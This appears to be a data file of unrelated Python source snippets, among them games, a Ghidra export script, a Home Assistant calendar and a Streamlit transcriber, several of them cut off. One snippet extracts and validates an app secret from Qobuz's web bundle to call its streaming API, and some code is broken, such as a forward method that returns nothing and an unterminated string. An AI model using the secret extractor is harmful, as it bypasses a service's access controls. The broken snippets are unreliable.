    "import random\r\nimport tkinter as tk\r\nfrom tkinter import messagebox\r\n\r\ncolours = ['Red', 'Blue', 'Green', 'Yellow', 'Orange', 'Purple', 'Pink', 'Black', 'White']\r\nscore = 0\r\ntimeleft = 30\r\n\r\ndef next_colour():\r\n    global score, timeleft\r\n\r\n    if timeleft > 0:\r\n        user_input = e.get().lower()\r\n        correct_color = colours[1].lower()\r\n\r\n        if user_input == correct_color:\r\n            score += 1\r\n\r\n        e.delete(0, tk.END)\r\n        random.shuffle(colours)\r\n        label.config(fg=colours[1], text=colours[0])\r\n        score_label.config(text=f\"Score: {score}\")\r\n\r\n\r\ndef countdown():\r\n    global timeleft\r\n    if timeleft > 0:\r\n        timeleft -= 1\r\n        time_label.config(text=f\"Time left: {timeleft}\")\r\n        time_label.after(1000, countdown)\r\n    else:\r\n    # messagebox.showwarning ('Attention', 'Your time is out!!')\r\n        scoreshow()\r\n        \r\n\r\ndef record_highest_score():\r\n    highest_score = load_highest_score()\r\n    if score > highest_score:\r\n        with open(\"highest_score.txt\", \"w\") as file:\r\n            file.write(str(score))\r\n    \r\n\r\n\r\ndef load_highest_score():\r\n    try:\r\n        with open(\"highest_score.txt\", \"r\") as file:\r\n            data = file.read()\r\n            if data:\r\n                return int(data)\r\n            else:\r\n                return 0\r\n    except FileNotFoundError:\r\n        return 0\r\n\r\n\r\ndef scoreshow():\r\n    record_highest_score()\r\n    window2 = tk.Tk()\r\n    window2.title(\"HIGH SCORE\")\r\n    window2.geometry(\"300x200\")\r\n\r\n    label = tk.Label(window2, text=f\"Highest Score: {load_highest_score()}\",font=(font, 12))\r\n   \r\n    label.pack()\r\n\r\n    window2.mainloop()\r\n\r\ndef start_game(event):\r\n    global timeleft\r\n    if timeleft == 30:\r\n        countdown()\r\n    next_colour()\r\n\r\nwindow = tk.Tk()\r\nfont = 'Helvetica'\r\nwindow.title(\"Color Game\")\r\nwindow.iconbitmap(\"color_game_icon.ico\")\r\nwindow.geometry(\"375x250\")\r\nwindow.resizable(False, False)\r\n\r\ninstructions = tk.Label(window, text=\"Enter the color of the text, not the word!\", font=(font, 12))\r\ninstructions.pack(pady=10)\r\n\r\nscore_label = tk.Label(window, text=\"Press Enter to start\", font=(font, 12))\r\nscore_label.pack()\r\n \r\ntime_label = tk.Label(window, text=f\"Time left: {timeleft}\", font=(font, 12))\r\ntime_label.pack()\r\n\r\nlabel = tk.Label(window, font=(font, 60))\r\nlabel.pack(pady=20)\r\n\r\ne = tk.Entry(window)\r\nwindow.bind('<Return>', start_game)\r\ne.pack()\r\n\r\ne.focus_set()\r\n\r\nwindow.mainloop()",
    "# Copyright (c) 2023 Amphion.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\n#################### Norm2D for Discriminators ####################\n\nimport torch\nimport torch.nn as nn\nimport einops\nfrom torch.nn.utils import spectral_norm, weight_norm\n\nCONV_NORMALIZATIONS = frozenset(\n    [\n        \"none\",\n        \"weight_norm\",\n        \"spectral_norm\",\n        \"time_layer_norm\",\n        \"layer_norm\",\n        \"time_group_norm\",\n    ]\n)\n\n\nclass ConvLayerNorm(nn.LayerNorm):\n    \"\"\"\n    Convolution-friendly LayerNorm that moves channels to last dimensions\n    before running the normalization and moves them back to original position right after.\n    \"\"\"\n\n    def __init__(self, normalized_shape, **kwargs):\n        super().__init__(normalized_shape, **kwargs)\n\n    def forward(self, x):\n        x = einops.rearrange(x, \"b ... t -> b t ...\")\n        x = super().forward(x)\n        x = einops.rearrange(x, \"b t ... -> b ... t\")\n        return\n\n\ndef apply_parametrization_norm(module: nn.Module, norm: str = \"none\") -> nn.Module:\n    assert norm in CONV_NORMALIZATIONS\n    if norm == \"weight_norm\":\n        return weight_norm(module)\n    elif norm == \"spectral_norm\":\n        return spectral_norm(module)\n    else:\n        # We already check was in CONV_NORMALIZATION, so any other choice\n        # doesn't need reparametrization.\n        return module\n\n\ndef get_norm_module(\n    module: nn.Module, causal: bool = False, norm: str = \"none\", **norm_kwargs\n) -> nn.Module:\n    \"\"\"Return the proper normalization module. If causal is True, this will ensure the returned\n    module is causal, or return an error if the normalization doesn't support causal evaluation.\n    \"\"\"\n    assert norm in CONV_NORMALIZATIONS\n    if norm == \"layer_norm\":\n        assert isinstance(module, nn.modules.conv._ConvNd)\n        return ConvLayerNorm(module.out_channels, **norm_kwargs)\n    elif norm == \"time_group_norm\":\n        if causal:\n            raise ValueError(\"GroupNorm doesn't support causal evaluation.\")\n        assert isinstance(module, nn.modules.conv._ConvNd)\n        return nn.GroupNorm(1, module.out_channels, **norm_kwargs)\n    else:\n        return nn.Identity()\n\n\nclass NormConv2d(nn.Module):\n    \"\"\"Wrapper around Conv2d and normalization applied to this conv\n    to provide a uniform interface across normalization approaches.\n    \"\"\"\n\n    def __init__(\n        self,\n        *args,\n        norm: str = \"none\",\n        norm_kwargs={},\n        **kwargs,\n    ):\n        super().__init__()\n        self.conv = apply_parametrization_norm(nn.Conv2d(*args, **kwargs), norm)\n        self.norm = get_norm_module(self.conv, causal=False, norm=norm, **norm_kwargs)\n        self.norm_type = norm\n\n    def forward(self, x):\n        x = self.conv(x)\n        x = self.norm(x)\n        return x",
    "import smtplib\nimport random\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nimport os    \n\n# Replace with your own quotes or load from an external file\nQUOTES = [\n    \"Believe you can and you're halfway there. - Theodore Roosevelt\",\n    \"You are never too old to set another goal or to dream a new dream. - C.S. Lewis\",\n    \"Act as if what you do makes a difference. It does. - William James\",\n    \"Success is not final, failure is not fatal: It is the courage to continue that counts. - Winston Churchill\",\n    \"What lies behind us and what lies before us are tiny matters compared to what lies within us. - Ralph Waldo Emerson\",\n    \"The only way to do great work is to love what you do. - Steve Jobs\",\n    \"Dream big and dare to fail. - Norman Vaughan\",\n    \"It always seems impossible until it\u2019s done. - Nelson Mandela\",\n    \"The future belongs to those who believe in the beauty of their dreams. - Eleanor Roosevelt\",\n    \"You miss 100% of the shots you don\u2019t take. - Wayne Gretzky\",\n    \"Hardships often prepare ordinary people for an extraordinary destiny. - C.S. Lewis\",\n    \"Do not wait; the time will never be 'just right.' Start where you stand. - Napoleon Hill\",\n    \"The only limit to our realization of tomorrow is our doubts of today. - Franklin D. Roosevelt\",\n    \"Happiness is not something ready-made. It comes from your own actions. - Dalai Lama\",\n    \"I can do all things through Christ who strengthens me. - Philippians 4:13\",\n    \"For I know the plans I have for you, declares the Lord, plans to prosper you and not to harm you, plans to give you hope and a future. - Jeremiah 29:11\",\n    \"The Lord is my shepherd; I shall not want. - Psalm 23:1\",\n    \"And we know that in all things God works for the good of those who love him. - Romans 8:28\",\n    \"Be strong and courageous. Do not be afraid; do not be discouraged, for the Lord your God will be with you wherever you go. - Joshua 1:9\",\n    \"Trust in the Lord with all your heart and lean not on your own understanding. - Proverbs 3:5-6\",\n    \"As iron sharpens iron, so one person sharpens another. - Proverbs 27:17\",\n    \"The pain you feel today will be the strength you feel tomorrow. - Anonymous\",\n    \"Start where you are. Use what you have. Do what you can. - Arthur Ashe\",\n    \"Quality is not an act, it is a habit. - Aristotle\",\n    \"Opportunities don't happen. You create them. - Chris Grosser\",\n    \"Do not go where the path may lead, go instead where there is no path and leave a trail. - Ralph Waldo Emerson\",\n    \"You don\u2019t have to be great to start, but you have to start to be great. - Zig Ziglar\",\n    \"Do not be afraid of growing slowly; be afraid only of standing still. - Indian Proverb\",\n    \"A journey of a thousand miles begins with a single step. - Lao Tzu\",\n    \"Life is 10% what happens to us and 90% how we react to it. - Charles R. Swindoll\",\n    \"Don\u2019t let yesterday take up too much of today. - Will Rogers\",\n    \"If you stand straight, do not fear a crooked shadow. - Indian Proverb\",\n    \"An ounce of practice is worth more than tons of preaching. - Mahatma Gandhi\",\n    \"When the character of a man is not clear to you, look at his friends. - Indian Proverb\",\n    \"Success usually comes to those who are too busy to be looking for it. - Henry David Thoreau\",\n    \"Be like the lotus: trust in the light, grow through the dirt, believe in new beginnings. - Indian Proverb\",\n    \"Faith is taking the first step even when you don\u2019t see the whole staircase. - Martin Luther King Jr.\",\n    \"He who kneels before God can stand before anyone. - Anonymous\",\n    \"God is our refuge and strength, an ever-present help in trouble. - Psalm 46:1\",\n    \"A tree with strong roots laughs at storms. - Indian Proverb\",\n    \"A bird sitting on a tree is never afraid of the branch breaking, because her trust is not in the branch but in her own wings. - Indian Proverb\",\n    \"Blessed is the one who perseveres under trial because, having stood the test, that person will receive the crown of life. - James 1:12\",\n    \"When you walk through the fire, you will not be burned; the flames will not set you ablaze. - Isaiah 43:2\",\n    \"Peace I leave with you; my peace I give you. I do not give to you as the world gives. Do not let your hearts be troubled and do not be afraid. - John 14:27\",\n    \"There is no shortcut for hard work that leads to effectiveness. - Indian Proverb\",\n    \"Many are the plans in a person\u2019s heart, but it is the Lord\u2019s purpose that prevails. - Proverbs 19:21\",\n    \"Patience is bitter, but its fruit is sweet. - Indian Proverb\",\n    \"He who walks with the wise grows wise, but a companion of fools suffers harm. - Proverbs 13:20\",\n    \"The best time to plant a tree was twenty years ago. The second best time is now. - Chinese Proverb\",\n    \"It is not how much we do, but how much love we put into what we do that matters. - Mother Teresa\",\n    \"Do not be quick with your mouth, do not be hasty in your heart to utter anything before God. God is in heave",
    "import random, sys, pygame, time, copy\nfrom pygame.locals import *\n\nFPS = 10 # frames per second to update the screen\nWINDOWWIDTH = 640 # width of the program's window, in pixels\nWINDOWHEIGHT = 480 # height in pixels\nSPACESIZE = 50 # width & height of each space on the board, in pixels\nBOARDWIDTH = 8 # how many columns of spaces on the game board\nBOARDHEIGHT = 8 # how many rows of spaces on the game board\nWHITE_TILE = 'WHITE_TILE' # an arbitrary but unique value\nBLACK_TILE = 'BLACK_TILE' # an arbitrary but unique value\nEMPTY_SPACE = 'EMPTY_SPACE' # an arbitrary but unique value\nHINT_TILE = 'HINT_TILE' # an arbitrary but unique value\nANIMATIONSPEED = 25 # integer from 1 to 100, higher is faster animation\n\n# Amount of space on the left & right side (XMARGIN) or above and below\n# (YMARGIN) the game board, in pixels.\nXMARGIN = int((WINDOWWIDTH - (BOARDWIDTH * SPACESIZE)) / 2)\nYMARGIN = int((WINDOWHEIGHT - (BOARDHEIGHT * SPACESIZE)) / 2)\n\n#              R    G    B\nWHITE      = (255, 255, 255)\nBLACK      = (  0,   0,   0)\nGREEN      = (  0, 155,   0)\nBRIGHTBLUE = (  0,  50, 255)\nBROWN      = (174,  94,   0)\n\nTEXTBGCOLOR1 = BRIGHTBLUE\nTEXTBGCOLOR2 = GREEN\nGRIDLINECOLOR = BLACK\nTEXTCOLOR = WHITE\nHINTCOLOR = BROWN\n\n\ndef main():\n    global MAINCLOCK, DISPLAYSURF, FONT, BIGFONT, BGIMAGE\n\n    pygame.init()\n    MAINCLOCK = pygame.time.Clock()\n    DISPLAYSURF = pygame.display.set_mode((WINDOWWIDTH, WINDOWHEIGHT))\n    pygame.display.set_caption('Othello')\n    FONT = pygame.font.Font('freesansbold.ttf', 16)\n    BIGFONT = pygame.font.Font('freesansbold.ttf', 32)\n\n    # Set up the background image.\n    boardImage = pygame.image.load('othelloboard.png')\n    # Use smoothscale() to stretch the board image to fit the entire board:\n    boardImage = pygame.transform.smoothscale(boardImage, (BOARDWIDTH * SPACESIZE, BOARDHEIGHT * SPACESIZE))\n    boardImageRect = boardImage.get_rect()\n    boardImageRect.topleft = (XMARGIN, YMARGIN)\n    BGIMAGE = pygame.image.load('othellobackground.png')\n    # Use smoothscale() to stretch the background image to fit the entire window:\n    BGIMAGE = pygame.transform.smoothscale(BGIMAGE, (WINDOWWIDTH, WINDOWHEIGHT))\n    BGIMAGE.blit(boardImage, boardImageRect)\n\n    # Run the main game.\n    while True:\n        if runGame() == False:\n            break\n\n\ndef runGame():\n    # Plays a single game of reversi each time this function is called.\n\n    # Reset the board and game.\n    mainBoard = getNewBoard()\n    resetBoard(mainBoard)\n    showHints = False\n    turn = random.choice(['computer', 'player'])\n\n    # Draw the starting board and ask the player what color they want.\n    drawBoard(mainBoard)\n    playerTile, computerTile = enterPlayerTile()\n\n    # Make the Surface and Rect objects for the \"New Game\" and \"Hints\" buttons\n    newGameSurf = FONT.render('New Game', True, TEXTCOLOR, TEXTBGCOLOR2)\n    newGameRect = newGameSurf.get_rect()\n    newGameRect.topright = (WINDOWWIDTH - 8, 10)\n    hintsSurf = FONT.render('Hints', True, TEXTCOLOR, TEXTBGCOLOR2)\n    hintsRect = hintsSurf.get_rect()\n    hintsRect.topright = (WINDOWWIDTH - 8, 40)\n\n    while True: # main game loop\n        # Keep looping for player and computer's turns.\n        if turn == 'player':\n            # Player's turn:\n            if getValidMoves(mainBoard, playerTile) == []:\n                # If it's the player's turn but they\n                # can't move, then end the game.\n                break\n            movexy = None\n            while movexy == None:\n                # Keep looping until the player clicks on a valid space.\n\n                # Determine which board data structure to use for display.\n                if showHints:\n                    boardToDraw = getBoardWithValidMoves(mainBoard, playerTile)\n                else:\n                    boardToDraw = mainBoard\n\n                checkForQuit()\n                for event in pygame.event.get(): # event handling loop\n                    if event.type == MOUSEBUTTONUP:\n                        # Handle mouse click events\n                        mousex, mousey = event.pos\n                        if newGameRect.collidepoint( (mousex, mousey) ):\n                            # Start a new game\n                            return True\n                        elif hintsRect.collidepoint( (mousex, mousey) ):\n                            # Toggle hints mode\n                            showHints = not showHints\n                        # movexy is set to a two-item tuple XY coordinate, or None value\n                        movexy = getSpaceClicked(mousex, mousey)\n                        if movexy != None and not isValidMove(mainBoard, playerTile, movexy[0], movexy[1]):\n                            movexy = None\n\n                # Draw the game board.\n                drawBoard(boardToDraw)\n                drawInfo(boardToDraw, playerTile, computerTile, turn)\n\n                # Draw the \"New Game\" and \"Hints\" buttons.\n                DISPLAYSURF.blit(newGameSurf, newGameRect)\n                DISPLAYSURF.blit(",
    "\"\"\"\nGeneric framework path manipulation\n\"\"\"\n\nimport re\n\n__all__ = ['framework_info']\n\nSTRICT_FRAMEWORK_RE = re.compile(r\"\"\"(?x)\n(?P<location>^.*)(?:^|/)\n(?P<name>\n    (?P<shortname>\\w+).framework/\n    (?:Versions/(?P<version>[^/]+)/)?\n    (?P=shortname)\n    (?:_(?P<suffix>[^_]+))?\n)$\n\"\"\")\n\ndef framework_info(filename):\n    \"\"\"\n    A framework name can take one of the following four forms:\n        Location/Name.framework/Versions/SomeVersion/Name_Suffix\n        Location/Name.framework/Versions/SomeVersion/Name\n        Location/Name.framework/Name_Suffix\n        Location/Name.framework/Name\n\n    returns None if not found, or a mapping equivalent to:\n        dict(\n            location='Location',\n            name='Name.framework/Versions/SomeVersion/Name_Suffix',\n            shortname='Name',\n            version='SomeVersion',\n            suffix='Suffix',\n        )\n\n    Note that SomeVersion and Suffix are optional and may be None\n    if not present\n    \"\"\"\n    is_framework = STRICT_FRAMEWORK_RE.match(filename)\n    if not is_framework:\n        return None\n    return is_framework.groupdict()\n",
    "import asyncio\r\nimport datetime\r\nimport hashlib\r\nfrom urllib.parse import urlencode\r\nimport aiohttp\r\nimport re\r\nimport base64\r\nfrom typing import Dict, List\r\n\r\nasync def get_app_id_and_secrets():\r\n    try:\r\n        seed_timezone_regex = re.compile(r'[a-z]\\.initialSeed\\(\"(?P<seed>[\\w=]+)\",window\\.utimezone\\.(?P<timezone>[a-z]+)\\)')\r\n        app_id_regex = re.compile(r'production:{api:{appId:\"(?P<app_id>\\d{9})\",appSecret:\"(\\w{32})')\r\n\r\n        async with aiohttp.ClientSession() as session:\r\n            async with session.get(\"https://play.qobuz.com/login\") as response:\r\n                login_page = await response.text()\r\n\r\n            bundle_url_match = re.search(r'<script src=\"(/resources/\\d+\\.\\d+\\.\\d+-[a-z]\\d{3}/bundle\\.js)\"></script>', login_page)\r\n            if not bundle_url_match:\r\n                raise ValueError(\"Could not find bundle URL.\")\r\n            bundle_url = bundle_url_match.group(1)\r\n\r\n            async with session.get(f\"https://play.qobuz.com{bundle_url}\") as response:\r\n                bundle = await response.text()\r\n\r\n            app_id_match = app_id_regex.search(bundle)\r\n            if not app_id_match:\r\n                raise ValueError(\"Could not find app ID.\")\r\n            app_id = app_id_match.group(\"app_id\")\r\n\r\n            secrets: Dict[str, List[str]] = {}\r\n            for seed_match in seed_timezone_regex.finditer(bundle):\r\n                seed = seed_match.group(\"seed\")\r\n                timezone = seed_match.group(\"timezone\")\r\n                secrets[timezone] = [seed]\r\n\r\n            timezones = \"|\".join([tz.capitalize() for tz in secrets.keys()])\r\n            info_extras_regex = re.compile(rf'name:\"\\w+/(?P<timezone>{timezones})\",info:\"(?P<info>[\\w=]+)\",extras:\"(?P<extras>[\\w=]+)\"')\r\n\r\n            for match in info_extras_regex.finditer(bundle):\r\n                timezone = match.group(\"timezone\").lower()\r\n                info = match.group(\"info\")\r\n                extras = match.group(\"extras\")\r\n                if timezone in secrets:\r\n                    secrets[timezone].extend([info, extras])\r\n\r\n            decoded_secrets = []\r\n            for secret_array in secrets.values():\r\n                combined_secret = \"\".join(secret_array)[:-44]\r\n                try:\r\n                    decoded_secret = base64.b64decode(combined_secret).decode(\"utf-8\")\r\n                    if decoded_secret:\r\n                        decoded_secrets.append(decoded_secret)\r\n                except (base64.binascii.Error, UnicodeDecodeError):\r\n                    continue\r\n\r\n            valid_secret = \"\"\r\n\r\n            for secret in decoded_secrets:\r\n                timestamp = datetime.datetime.now().timestamp()\r\n                r_sig = f\"trackgetFileUrlformat_id27intentstreamtrack_id1{timestamp}{secret}\"\r\n                r_sig_hashed = hashlib.md5(r_sig.encode()).hexdigest()\r\n\r\n                params = {\r\n                    \"format_id\": 27,\r\n                    \"intent\": \"stream\",\r\n                    \"track_id\": 1,\r\n                    \"request_ts\": timestamp,\r\n                    \"request_sig\": r_sig_hashed,\r\n                }\r\n                url = f\"https://www.qobuz.com/api.json/0.2/track/getFileUrl?{urlencode(params)}\"\r\n\r\n                headers = {\r\n                    \"X-App-Id\": app_id,\r\n                }\r\n                async with aiohttp.ClientSession() as session:\r\n                    async with session.get(url, headers=headers) as response:\r\n                        if response.status != 400:\r\n                            valid_secret = secret\r\n                            break \r\n            return {\"app_id\": app_id, \"secret\": valid_secret}\r\n\r\n    except Exception as e:\r\n        print(f\"Error: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n    app_id_and_secrets = asyncio.run(get_app_id_and_secrets())\r\n    print(app_id_and_secrets)",
    "import json\n\nfilename = '/src/resources/Data.json'\nfilename1 = '/home/vboxuser/PycharmProject/Speed Test/src/resources/relatorio.txt\n\nwith open(filename) as f:\n    content = json.load(f)\n\n# soma\nsum_download = 0\nsum_upload = 0\nsum_ping = 0\n\n# ultimos 3 elementos da lista\nlast_three = content[-3:]\n\n# datas\nstart = last_three[0][\"date\"]\nend = last_three[-1][\"date\"]\n\n# somando\nfor down_up in last_three:\n    sum_download += down_up[\"download\"]\n    sum_upload += down_up[\"upload\"]\n    sum_ping += down_up[\"ping\"]\n\n# Calcular as m\u00e9dias\ndown_avarage = sum_download / len(last_three)\nup_avarage = sum_upload / len(last_three)\nping_avarage = sum_ping / len(last_three)\n\n# status\ndown_status = (down_avarage >= 4 and down_avarage <= 10)\nup_status = (up_avarage >= 1 and up_avarage <= 3)\nping_status = (ping_avarage <= 100)\n\n# Criar relatorio\ntext = (f'\\nAvarage Download: {down_avarage: .2f} Mbps  Stable = {down_status}\\n'\n        f'Avarage Upload: {up_avarage: .2f} Mbps  Stable = {up_status}\\n'\n        f'Avarage Ping: {ping_avarage: .2f} ms  Stable = {ping_status}\\nStart: {start} End: {end}\\n')\n\n\nwith open(filename1, 'a') as f:\n    f.write(text)\n\nprint(f\"Report available at the file {filename1}\")\n",
    "import re\nimport json\n\nclass QueryProcessor:\n    def __init__(self, agents):\n        self.agents = agents\n\n    def process_query(self, query: str) -> str:\n        \"\"\"\n        Process a natural language query and route it to the correct agent.\n        \"\"\"\n        # Define patterns for commands\n        patterns = [\n            (r\"analyze data for task (\\d+) with data: (.+)\", \"TechAgent\", \"analyze_data\"),\n            (r\"generate a narrative for task (\\d+)\", \"ConceptAgent\", \"generate_narrative\"),\n            (r\"check progress for task (\\d+)\", \"TaskAgent\", \"track_progress\")\n        ]\n\n        # Match query to a pattern\n        for pattern, agent_name, command in patterns:\n            match = re.match(pattern, query, re.IGNORECASE)\n            if match:\n                agent = self.agents.get(agent_name)\n                if not agent:\n                    return f\"Agent '{agent_name}' not found.\"\n                \n                args = [json.loads(arg) if arg.startswith(\"[\") or arg.startswith(\"{\") else arg for arg in match.groups()]\n                return agent.parse_command(command, *args)\n\n        return \"Sorry, I didn't understand your query. Please try again.\"\n",
    "# Export Function Graph to .dot files\n# @runtime Jython\n\n\nimport json\nimport tempfile\nimport os\n\nfrom ghidra.program.model.block import BasicBlockModel\nfrom ghidra.util.task import ConsoleTaskMonitor\n\nBULK_JSON_EXPORT = False\n\n\ndef collect_nodes(elist):\n    ret = set()\n    for f, t in elist:\n        ret.add(f)\n        if t is not None:\n            ret.add(t)\n    return ret\n\n\ndef address2name(addr):\n    return \"BB%s\" % (str(addr))\n\n\ndef block_instructions_count(block):\n    ret = 0\n    for a in block.getAddresses(True):\n        if getInstructionAt(a) != None:\n            ret += 1\n    return ret\n\n\ndef get_color(source, target):\n    if source.getNumDestinations(monitor) < 2:\n        return \"regular\"\n    i = getInstructionContaining(source.getMaxAddress())\n    if i.getFallThrough() is None:  # Unconditional branch as last decoded instruction\n        return \"regular\"\n    if i.getFallThrough().equals(target.getFirstStartAddress()):\n        return \"alternative\"\n    # TODO do some sanity checks, the CodeBlock abstraction is weird...\n    return \"consequence\"\n\n\ndef get_color_dot(source, target):\n    color = get_color(source, target)\n    if color == \"regular\":\n        return \"blue\"\n    elif color == \"alternative\":\n        return \"red\"\n    return \"green\"\n\n\ndef export_dot(name, elist):\n    out = []\n    out.append(\"digraph %s {\" % (name))\n    out.append('  node [shape=\"box\"];')\n    out.append(\"  graph [splines=ortho];\")\n    for f, t in elist:\n        if t is None: continue\n        f_addr = f.getFirstStartAddress()\n        t_addr = t.getFirstStartAddress()\n        out.append(\n            '  %s -> %s [color=\"%s\"];'\n            % (address2name(f_addr), address2name(t_addr), get_color_dot(f, t))\n        )\n    out.append(\"}\")\n    return \"\\n\".join(out)\n\n\nname_counter = 0\n\n\ndef export_json(name, elist):\n    data = {}\n    data[\"options\"] = {\"type\": \"directed\", \"multi\": True, \"allowSelfLoops\": True}\n    data[\"attributes\"] = {}\n    data[\"nodes\"] = []\n    data[\"edges\"] = []\n    nodes = collect_nodes(elist)\n\n    for n in nodes:\n        node_data = {}\n        node_data[\"key\"] = address2name(n.getFirstStartAddress())\n        node_data[\"attributes\"] = {}\n        node_data[\"attributes\"][\"lines\"] = block_instructions_count(n)\n        data[\"nodes\"].append(node_data)\n\n    for s, t in elist:\n        if t is None: continue\n        edge_data = {}\n        edge_data[\"source\"] = address2name(s.getFirstStartAddress())\n        edge_data[\"target\"] = address2name(t.getFirstStartAddress())\n        edge_data[\"attributes\"] = {}\n        edge_data[\"attributes\"][\"type\"] = get_color(s, t)\n        data[\"edges\"].append(edge_data)\n\n    return data\n\n\nblockModel = BasicBlockModel(currentProgram)\nmonitor = ConsoleTaskMonitor()\n\nbin_name = os.path.basename(getCurrentProgram().getExecutablePath())\nbin_hash = getCurrentProgram().getExecutableSHA256()\n\nproject_name = bin_name\nif \"GHIDRA_EXPORT_PROJECT\" in os.environ:\n    project_name = os.environ[\"GHIDRA_EXPORT_PROJECT\"]\n\nbin_version = bin_hash\nif \"GHIDRA_EXPORT_VERSION\" in os.environ:\n    bin_version = os.environ[\"GHIDRA_EXPORT_VERSION\"]\n\n\nbase_dir = os.path.join(tempfile.gettempdir(), \"ghidra_export\")\nif \"GHIDRA_EXPORT_OUTDIR\" in os.environ:\n    base_dir = os.environ[\"GHIDRA_EXPORT_OUTDIR\"]\n\nbin_dir = os.path.join(base_dir, project_name)\nos.makedirs(bin_dir)\n\nall_json = []\nfunc_index = []\n\nfunc = getFirstFunction()\nwhile func is not None:\n    if func.isExternal() or func.isThunk():\n        func = getFunctionAfter(func)\n        continue\n\n    func_name = func.getName()\n    entry_str = str(func.getEntryPoint())\n    edge_list = []\n\n    print(\"[*] Parsing %s\" % (func_name))\n    # based on code by cetfor: https://github.com/NationalSecurityAgency/ghidra/issues/855#issuecomment-569355675\n    blocks = blockModel.getCodeBlocksContaining(func.getBody(), monitor)\n\n    while blocks.hasNext():\n        bb = blocks.next()\n        dest = bb.getDestinations(monitor)\n        while dest.hasNext():\n            dbb = dest.next()\n            if not getFunctionAt(dbb.getDestinationAddress()):\n                edge_list.append((dbb.getSourceBlock(), dbb.getDestinationBlock()))\n        if (len(edge_list) == 0): # Always add the entry block\n            edge_list.append((bb, None))\n\n    dot_export = export_dot(func_name, edge_list)\n    json_export = export_json(func_name, edge_list)\n\n    func_index.append(\n        {\n            \"address\": entry_str,\n            \"name\": func_name,\n            \"node_count\": len(json_export[\"nodes\"]),\n        }\n    )\n    if BULK_JSON_EXPORT:\n        all_json.append(json.loads(json_export))  # TODO Wasteful, need refactoring\n\n    dot_path = os.path.join(bin_dir, \"%s.dot\" % (entry_str))\n    with open(dot_path, \"w\") as out:\n        out.write(dot_export)\n    print(\" \\_ Written %s\" % (dot_path))\n\n    json_path = os.path.join(bin_dir, \"%s.json\" % (entry_str))\n    with open(json_path, \"w\") as out:\n        json.dump(json_export, out, sort_keys=True, indent=2)\n    print(\" \\_ Written %s\" % (json_path))\n\n    func = getFunc",
    "from datetime import datetime, timedelta\nfrom homeassistant.components.calendar import CalendarEntity, CalendarEvent\nfrom homeassistant.util import dt as dt_util\nfrom .const import DOMAIN\nimport aiohttp\nimport logging\n\n_LOGGER = logging.getLogger(__name__)\nURL = \"https://api.raporty.pse.pl/api/pdgsz?$filter=udtczas%20gt%20'{}'\"\n\nSTATUS_MAPPING = {\n    0: \"ZALECANE U\u017bYTKOWANIE\",\n    1: \"NORMALNE U\u017bYTKOWANIE\",\n    2: \"ZALECANE OSZCZ\u0118DZANIE\",\n    3: \"WYMAGANE OGRANICZANIE\",\n}\n\nasync def async_setup_entry(hass, config_entry, async_add_entities):\n    async_add_entities([EnergetycznyKompasCalendar()])\n\nclass EnergetycznyKompasCalendar(CalendarEntity):\n\n    def __init__(self):\n        super().__init__()\n        self._name = \"Energetyczny Kompas\"\n        self._events: list[CalendarEvent] = []\n        self._attr_unique_id = f\"{DOMAIN}_calendar\"\n        self._attr_name = \"Energetyczny Kompas Calendar\"\n\n    @property\n    def name(self):\n        return self._name\n\n    @property\n    def has_entity_name(self):\n        return True\n\n    @property\n    def event(self) -> CalendarEvent | None:\n        now = dt_util.now()\n        for event in self._events:\n            if event.start <= now < event.end:\n                return event\n        return None\n\n    async def async_get_events(\n        self, hass, start_date: datetime, end_date: datetime\n    ) -> list[CalendarEvent]:\n        await self.async_update()\n        return [\n            event\n            for event in self._events\n            if start_date <= event.start < end_date\n        ]\n\n    async def async_update(self):\n        try:\n            formatted_date = dt_util.now().strftime(\"%Y-%m-%d\")\n            url = URL.format(formatted_date)\n\n            async with aiohttp.ClientSession() as session:\n                async with session.get(url) as response:\n                    response.raise_for_status()\n                    data = await response.json()\n\n            self._events = [\n                CalendarEvent(\n                    summary=f\"Status: {STATUS_MAPPING.get(entry['znacznik'], 'NIEZNANY STATUS')}\",\n                    start=self._parse_time(entry[\"udtczas\"]),\n                    end=self._parse_time(entry[\"udtczas\"], add_hour=True),\n                    description=f\"{entry['znacznik']}\",\n                )\n                for entry in data[\"value\"]\n            ]\n        except Exception as e:\n            _LOGGER.error(\"Error fetching data from PSE API: %s\", e)\n            self._events = []\n\n    def _parse_time(self, timestamp: str, add_hour: bool = False) -> datetime:\n        date_obj = datetime.strptime(timestamp, \"%Y-%m-%d %H:%M:%S\")\n\n        if add_hour:\n            date_obj += timedelta(hours=1)\n\n        return date_obj.replace(tzinfo=dt_util.DEFAULT_TIME_ZONE)\n",
    "import streamlit as st\nimport os\nimport requests\nimport base64\nfrom transformers import pipeline\nimport re\nimport spacy\nimport io\nimport yt_dlp\n\n# Load spaCy's pre-trained English model\nnlp = spacy.load(\"en_core_web_sm\")\n\n# Add background image function\ndef add_bg_from_local(image_file):\n    with open(image_file, \"rb\") as image_file:\n        encoded_string = base64.b64encode(image_file.read())\n    st.markdown(\n        f\"\"\"\n        <style>\n        .stApp {{\n            background-image: linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.85)), url(data:image/{\"jpg\"};base64,{encoded_string.decode()});\n            background-size: cover;\n            background-position: center;\n            background-attachment: fixed;\n        }}\n        </style>\n        \"\"\",\n        unsafe_allow_html=True\n    )\n\n# Add background\nadd_bg_from_local('microphone.png')  # Adjust path as needed\n\n# Function to extract video ID from URL\ndef extract_video_id(url):\n    video_id = None\n    match = re.search(r'(?:youtube\\.com\\/(?:[^\\/\\n]+\\/[^\\n]+\\/|(?:v|e(?:mbed)?)\\/|\\S+?[?&]v=)|youtu\\.be\\/)([a-zA-Z0-9_-]+)', url)\n    if match:\n        video_id = match.group(1)\n    return video_id\n\n# Function to download audio from YouTube video\ndef download_audio(video_url, output_folder=\"audio\"):\n    video_id = extract_video_id(video_url)\n    if not video_id:\n        st.error(\"Unable to extract video ID from the URL\")\n        return None\n    \n    output_path = os.path.join(output_folder, f\"{video_id}.mp3\")\n    \n    ydl_opts = {\n        'format': 'bestaudio/best',\n        'extractaudio': True,\n        'audioquality': 1,\n        'outtmpl': output_path,\n    }\n    \n    with yt_dlp.YoutubeDL(ydl_opts) as ydl:\n        ydl.download([video_url])\n    \n    return output_path\n\n# Reverie transcription API\ndef transcribe_audio_reverie(audio_file, lang):\n    api_url = \"https://revapi.reverieinc.com/\"\n    headers = {\n        'REV-API-KEY': 